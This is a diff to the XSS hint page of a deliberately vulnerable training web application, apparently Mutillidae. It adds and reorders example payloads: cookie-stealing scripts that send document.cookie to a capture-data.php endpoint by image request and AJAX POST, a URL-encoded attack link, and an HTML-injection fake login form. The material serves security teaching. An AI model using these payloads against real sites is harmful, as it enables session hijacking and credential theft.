@@ -140,7 +140,7 @@
 			Try Tamper Data to get control of all the HTTP headers in the request. 
 			You can start by changing the user-agent to see your input displayed here.
 			<br/><br/>
-			<span class="report-header">Examples</span>
+			<span class="report-header">Examples - Proof of Concept</span>
 			<br/><br/>	
 			Many examples can be found at <a href="http://ha.ckers.org/xss.html">http://ha.ckers.org/xss.html</a>.
 			A basic test for XSS may be the following that attempts to pop up an alert box
@@ -159,31 +159,52 @@
 			<br /><br />
 <code>&lt;script&gt;alert(\&#39;Cookies which do not have the HTTPOnly attribute set: \&#39; + document.cookie);&lt;/script&gt;</code>
 			<br/><br/>
+			<span class="report-header">Examples - Stealing Cookies</span>
+			<br/><br/>	
 			A more realistic attempt of cookie stealing includes some mechanism to send the value
 			of the cookie to an attacker controlled server
 			<br />
 <code>
-&lt;script&gt;
-	new Image().src="http://some-ip/mutillidae/catch.php?cookie="+encodeURI(document.cookie);
-&lt;/script&gt;
+    &lt;script&gt;
+    	new Image().src="http://[the-ip-of-mutillidae]/mutillidae/capture-data.php?cookie="+encodeURI(document.cookie);
+    &lt;/script&gt;
 </code>
-			<br/>
+			<br />
+			When passing code as a parameter value, the code has to be encoded so that is does not get parsed by the web server. The code needs to make it passed the web server to the application without being modified by the web server.
+			<br />
+<code>
+	%3Cscript%3Enew%20Image().src%3D%22http%3A%2F%2Fmutillidae.local%2Fcapture-data.php%3Fcookie%3D%22%2BencodeURI(document.cookie)%3B%3C%2Fscript%3E
+</code>
+			<br />
+			An example of a complete URL is the following. Note: Substitute the domain name or IP address of your Mutillidae installation.
+			<br />
+<code>
+	http://[ip-address-of-mutillidae]/mutillidae/index.php?page=user-info.php&username=%3Cscript%3Enew%20Image().src%3D%22http%3A%2F%2Fmutillidae.local%2Fcapture-data.php%3Fcookie%3D%22%2BencodeURI(document.cookie)%3B%3C%2Fscript%3E&password=&user-info-php-submit-button=View+Account+Details
+</code>
+
+
+
+			<br/><br/>
+			<span class="report-header">Examples - HTML Injection</span>
+			<br/><br/>	
 			JavaScript is not the only language that can be used. HTML is another choice that can be effective.
 			<br/><br/>
 <code>&lt;h1&gt;Sorry. There has been a system error.&lt;br /&gt;&lt;br /&gt;Please login again&lt;/h1&gt;&lt;br/&gt;Username&lt;input type=&quot;text&quot;&gt;&lt;br/&gt;Password&lt;input type=&quot;text&quot;&gt;&lt;br/&gt;&lt;br/&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;&lt;h1&gt;&amp;nbsp;&lt;/h1&gt;</code>
 			<br/><br/>
+			<span class="report-header">Examples - Realistic Attack</span>
+			<br/><br/>	
 			AJAX can make the XSS more stealthy
 			<br/><br/>			
-			<span class="report-header">Example (For Samurai WTF)</span>
+			<span class="report-header">Example (For non-Samurai WTF users)</span>
 			<br/><br/>
 			<textarea cols="80" rows="20">
 			&lt;script&gt;
 				var lXMLHTTP;
 				try{ 
 					var lData = &quot;data=&quot; + encodeURIComponent(document.cookie);
-					var lHost = &quot;mutillidae&quot;;
+					var lHost = &quot;localhost&quot;;
 					var lProtocol = &quot;http&quot;;
-					var lFilePath = &quot;/capture-data.php&quot;;
+					var lFilePath = &quot;/mutillidae/capture-data.php&quot;;
 					var lAction = lProtocol + &quot;://&quot; + lHost + lFilePath;
 					var lMethod = &quot;POST&quot;;
 			
@@ -213,16 +234,16 @@
 			&lt;/script&gt;
 			</textarea>
 			<br/><br/>
-			<span class="report-header">Example (For non-Samurai WTF users)</span>
+			<span class="report-header">Example (For Samurai WTF)</span>
 			<br/><br/>
 			<textarea cols="80" rows="20">
 			&lt;script&gt;
 				var lXMLHTTP;
 				try{ 
 					var lData = &quot;data=&quot; + encodeURIComponent(document.cookie);
-					var lHost = &quot;localhost&quot;;
+					var lHost = &quot;mutillidae&quot;;
 					var lProtocol = &quot;http&quot;;
-					var lFilePath = &quot;/mutillidae/capture-data.php&quot;;
+					var lFilePath = &quot;/capture-data.php&quot;;
 					var lAction = lProtocol + &quot;://&quot; + lHost + lFilePath;
 					var lMethod = &quot;POST&quot;;
 			
